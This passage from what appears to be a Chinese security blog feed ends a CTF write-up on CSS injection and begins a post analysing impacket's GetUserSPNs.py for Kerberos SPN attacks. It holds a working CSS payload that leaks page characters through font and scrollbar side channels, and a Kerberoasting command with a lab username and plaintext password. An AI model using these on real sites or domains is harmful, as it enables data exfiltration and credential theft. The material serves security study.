class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* comic sans is high (lol) and causes a vertical overflow */</span></span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_A;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">41</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_B;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">42</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_C;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">43</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_D;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">44</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_E;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">45</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_F;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">46</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_G;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">47</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_H;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">48</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_I;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">49</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_J;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">4</span>a;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_K;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">4</span>b;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_L;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">4</span>c;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_M;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">4</span>d;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_N;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">4</span>e;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_O;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">4</span>f;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_P;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">50</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_Q;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">51</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_R;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">52</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_S;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">53</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_T;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">54</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_U;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">55</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_V;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">56</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_W;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">57</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_X;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">58</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_Y;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">59</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_Z;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">5</span>a;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_0;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">30</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_1;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">31</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_2;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">32</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_3;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">33</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_4;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">34</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_5;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">35</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_6;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">36</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_7;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">37</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_8;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">38</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_9;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">39</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span>:rest;<span class="attribute">src</span>: <span class="built_in">local</span>(<span class="string">&#x27;Courier New&#x27;</span>);<span class="attribute">font-style</span>:monospace;unicode-range:U+<span class="number">0</span>-<span class="number">10</span>FFFF&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span><span class="selector-class">.leak</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">overflow-y</span>: auto; <span class="comment">/* leak channel */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">overflow-x</span>: hidden; <span class="comment">/* remove false positives */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">40px</span>; <span class="comment">/* comic sans capitals exceed this height */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>: <span class="number">0px</span>; <span class="comment">/* make suffix invisible */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">letter-spacing</span>: <span class="number">0px</span>; <span class="comment">/* separation */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">word-break</span>: break-all; <span class="comment">/* small width split words in lines */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-family</span>: rest; <span class="comment">/* default */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: grey; <span class="comment">/* default */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">0px</span>; <span class="comment">/* initial value */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">animation</span>: loop step-end <span class="number">200s</span> <span class="number">0s</span>, trychar step-end <span class="number">2s</span> <span class="number">0s</span>; <span class="comment">/* animations: trychar duration must be 1/100th of loop duration */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">animation-iteration-count</span>: <span class="number">1</span>, infinite; <span class="comment">/* single width iteration, repeat trychar one per width increase (or infinite) */</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span><span class="selector-class">.leak</span><span class="selector-pseudo">::first-line</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>: <span class="number">30px</span>; <span class="comment">/* prefix is visible in first line */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-transform</span>: uppercase; <span class="comment">/* only capital letters leak */</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* iterate over all chars */</span></span></span><br><span class="line"><span class="language-css"><span class="keyword">@keyframes</span> trychar &#123;</span></span><br><span class="line"><span class="language-css">    <span class="number">5%</span> &#123; <span class="attribute">font-family</span>: has_A, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?a</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">6%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">10%</span> &#123; <span class="attribute">font-family</span>: has_B, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?b</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">11%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">15%</span> &#123; <span class="attribute">font-family</span>: has_C, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?c</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">16%</span> &#123; <span class="attribute">font-family</span>: rest &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">20%</span> &#123; <span class="attribute">font-family</span>: has_D, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?d</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">21%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">25%</span> &#123; <span class="attribute">font-family</span>: has_E, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?e</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">26%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">30%</span> &#123; <span class="attribute">font-family</span>: has_F, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?f</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">31%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">35%</span> &#123; <span class="attribute">font-family</span>: has_G, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?g</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">36%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">40%</span> &#123; <span class="attribute">font-family</span>: has_H, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?h</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">41%</span> &#123; <span class="attribute">font-family</span>: rest &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">45%</span> &#123; <span class="attribute">font-family</span>: has_I, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?i</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">46%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">50%</span> &#123; <span class="attribute">font-family</span>: has_J, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?j</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">51%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">55%</span> &#123; <span class="attribute">font-family</span>: has_K, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?k</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">56%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">60%</span> &#123; <span class="attribute">font-family</span>: has_L, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?l</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">61%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">65%</span> &#123; <span class="attribute">font-family</span>: has_M, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?m</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">66%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">70%</span> &#123; <span class="attribute">font-family</span>: has_N, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?n</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">71%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">75%</span> &#123; <span class="attribute">font-family</span>: has_O, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?o</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">76%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">80%</span> &#123; <span class="attribute">font-family</span>: has_P, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?p</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">81%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">85%</span> &#123; <span class="attribute">font-family</span>: has_Q, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?q</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">86%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">90%</span> &#123; <span class="attribute">font-family</span>: has_R, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?r</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">91%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">95%</span> &#123; <span class="attribute">font-family</span>: has_S, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?s</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">96%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* increase width char by char, i.e. add new char to prefix */</span></span></span><br><span class="line"><span class="language-css"><span class="keyword">@keyframes</span> loop &#123;</span></span><br><span class="line"><span class="language-css">    <span class="number">0%</span> &#123; <span class="attribute">width</span>: <span class="number">0px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">1%</span> &#123; <span class="attribute">width</span>: <span class="number">20px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">2%</span> &#123; <span class="attribute">width</span>: <span class="number">40px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">3%</span> &#123; <span class="attribute">width</span>: <span class="number">60px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">4%</span> &#123; <span class="attribute">width</span>: <span class="number">80px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">4%</span> &#123; <span class="attribute">width</span>: <span class="number">100px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">5%</span> &#123; <span class="attribute">width</span>: <span class="number">120px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">6%</span> &#123; <span class="attribute">width</span>: <span class="number">140px</span> &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">7%</span> &#123; <span class="attribute">width</span>: <span class="number">0px</span> &#125;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span>::-webkit-scrollbar &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: blue;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* side-channel */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span>::-webkit-scrollbar:vertical &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: blue <span class="built_in">var</span>(--leak);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>single css injection w/o remote fonts to leak charset ft. @kinugawamasato&#x27;s <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html&quot;</span>&gt;</span>unicode-range<span class="tag">&lt;/<span class="name">a</span>&gt;</span> technique<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>the trick is using detectable layout differences between default fonts. there are probably many similar and more efficient methos.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;leak&quot;</span>&gt;</span></span><br><span class="line">cabdb</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>    </div></div><h3 id="ligature-scrollbar"><a href="#ligature-scrollbar" class="headerlink" title="ligature + scrollbar"></a>ligature + scrollbar</h3><p>有点难，暂时不复现</p><h1 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h1><p>增加csp头，比如 <code>style-src &#39;none&#39;</code> ，详情可以去翻看CSP那篇文章。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;没想到N1CTF出了css注入的题，第一眼就觉得是css注入，可惜那时候没学到这块，而且当时还在省赛（虽然应该也做不出来）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://aszx87410.github.io/beyond-xss/ch3/css-injection/&quot;&gt;https://aszx87410.github.io/beyond-xss/ch3/css-injection/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="https://kaikaix.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="https://kaikaix.github.io/tags/javascript/"/>
    
    <category term="xss" scheme="https://kaikaix.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>从impacket源码分析SPN</title>
    <link href="https://kaikaix.github.io/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/"/>
    <id>https://kaikaix.github.io/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/</id>
    <published>2023-10-25T06:35:57.000Z</published>
    <updated>2023-10-25T15:35:57.943Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前一直疑惑，网上都在说，通过这个去请求服务的TGS<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -request-user chenchen</span><br></pre></td></tr></table></figure><br>但是上面的命令又是-request-user，去请求用户，就搞得我很迷糊，最终还是通过查看源码，大概搞懂了<br><span id="more"></span></p><h1 id="SPN简介"><a href="#SPN简介" class="headerlink" title="SPN简介"></a>SPN简介</h1><p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN<br>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下<br>当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下<br>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p><h1 id="SPN-格式"><a href="#SPN-格式" class="headerlink" title="SPN 格式"></a>SPN 格式</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure><p>可以通过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A MSSQLSvc/DM.test.local:1433 sqladmin</span><br></pre></td></tr></table></figure><br>注册一个名为MSSQLSvc的SPN，将他分配给sqladmin这个域管账户</p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>之前打靶场遇到了一个问题<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -request-user chenchen</span><br></pre></td></tr></table></figure><br>通过上面的命令获取到了chenchen的ST，但是从上文说的，SPN是服务的标识符，那我怎么会获取到绑定该服务的域用户的ST，按理应该是获取到服务的ST才对</p><h2 id="GetUserSPNs源码简析"><a href="#GetUserSPNs源码简析" class="headerlink" title="GetUserSPNs源码简析"></a>GetUserSPNs源码简析</h2><p>接下来看看<code>GetUserSPNs.py</code>的关键源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">TGT = self.getTGT()</span><br><span class="line"><span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    fd = <span class="built_in">open</span>(self.__outputFileName, <span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    fd = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user, SPN <span 